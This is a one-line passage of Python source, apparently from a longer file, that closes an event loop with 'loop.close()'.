    loop.close()
